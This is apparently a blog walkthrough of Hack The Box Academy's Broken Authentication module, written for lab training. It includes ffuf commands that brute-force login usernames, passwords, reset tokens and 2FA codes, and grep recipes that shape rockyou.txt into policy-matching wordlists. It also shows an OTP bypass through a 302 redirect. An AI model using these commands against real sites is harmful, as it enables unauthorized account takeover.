---
layout: post
title:  "Hack The Box - Academy - Broken Authentication"
description: "Explore this detailed walkthrough of Hack The Box Academy's Broken Authentication module. Learn effective techniques to perform login brute-force attacks, authentication bypass techniques, and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-10-31 11:50
image:  /images/htb/broken-auth/logo.png
tags:   [authentication,cbbh]
categories: [htbacademy]
---

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/details/80">Broken Authentication</a><br/>
<a href="https://jacozwarts.github.io/images/htb/broken-auth/Broken_Authentication_Module_Cheat_Sheet.pdf">Broken Authentication - Cheat Sheet</a><br/>
<a href="https://www.cirt.net/passwords">CIRT.net - Default Passwords</a><br/>

<br/>

## Notes:

### Create custom wordlists by using grep and rockyou.txt
```
grep '[[:upper:]]' /usr/share/wordlists/seclists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```
#### `Count number` of line in file:

```
wc -l custom_wordlist.txt
```

#### Using `ffuf` with POST:
```
ffuf -w ./custom_wordlist.txt -u {TARGET} -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

#### Use seq to generate pins:

```
seq -w 0 9999 > tokens.txt
```

#### Extract details from csv:
```
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

#### Using ffuf with GET:
```
ffuf -w ./tokens.txt -u http://{TARGET}/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

#### Using ffuf with Session-Token:
```
ffuf -w ./tokens.txt -u http://{TARGET}/{ENDPOINT} -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
<hr/>

## Skills Assessment
><b>Overview:</b>
You are tasked to perform a security assessment of a client's web application. For the assessment, the client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.

### Explore the App’s Main Features
First, let’s check out the app's basic functions. We see options for logging in and registering, so let’s start by creating a test account with details `Test:Test`

### Make Note of Password Requirements
During registration, the app shows us its password criteria. Let’s keep that in mind—this info will come in handy when we need to create a custom wordlist for brute-forcing later.

![Password Criteria](/images/htb/broken-auth/skills-assessment-password-criteria.png)


### Log In with Our Test Account
Create an account using `Test:Password1234`. Now that we’ve got the account set up, let’s log in. Success! We’re redirected to profile.php.

### Spot the Restricted Access Message
On the profile page, we see a message saying, `"You do not have admin privileges. The site is still under construction and only available to admins at this time."` Since no other features are available, it’s clear that admin access will be the key to progressing further.

![Profile Page](/images/htb/broken-auth/skills-assessment-profile-page.png)

### Experiment with Brute-Forcing Admin Login
Let’s test the login form to understand how it responds to different credentials:

First, we try `admin:admin`, which gives us an `"Unknown username and password"` error.
Next, we use our account's username `Test` with an incorrect password, which returns `"Invalid Credentials"`.
Now we know what specific error messages to look for, giving us a way to validate results in our brute-force attempt.

### Pick Wordlists for the Brute-Force Attack
To find the correct username, we’ll start by using `seclists/Usernames/xato-net-10-million-usernames.txt`.
Once we have a valid username.

```
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://{TARGET}:{PORT}/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=1" -fr "Unknown username or password."
```

### Creating the password wordlist

To target the login credentials more efficiently, we’ll build a custom password list that meets the `password criteria` we noted earlier. We’ll start with `rockyou.txt` and use `grep` to filter only the passwords that match the format.

Grep function to extract passwords from wordlist:

```
grep -E '^[[:alnum:]]{12}$' /usr/share/wordlists/rockyou.txt | grep -E '[0-9]' | grep -E '[a-z]' | grep -E '[A-Z]' > passwords.txt
```

### Launch the Brute-Force Attack
Now that we have a wordlist tailored to the password criteria, we’re ready to begin our brute-force attack to find valid credentials. Using the `username` we found earlier and custom password wordlist, we’ll brute-force the login until we find the valid credentials.

Find valid credentials:
```
ffuf -w passwords.txt -u http://{TARGET}:{PORT}/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username={username}&password=FUZZ" -mc 302
```

### Handle the OTP Prompt
Once we’ve successfully logged in with the valid credentials, we’re met with an OTP prompt. However, there’s no indication of how long the OTP pin should be, which means we can’t effectively brute-force the OTP. This prompts us to consider alternative methods for bypassing the OTP.

![OTP Page](/images/htb/broken-auth/skills-assessment-password-otp.png)

### Attempt Direct Access to `profile.php`
Since we identified `profile.php` earlier when logged in with our `Test` account, let’s try directly accessing this page using the valid credentials we found. This time, the UI redirects us to an OTP page (2fa.php). Here, we notice a 302 redirect response from profile.php. Upon investigating this `302` request more closely, we can spot the flag embedded within the request itself.

![Profile Page](/images/htb/broken-auth/skill-assessment-redirect-request.png)


<hr/>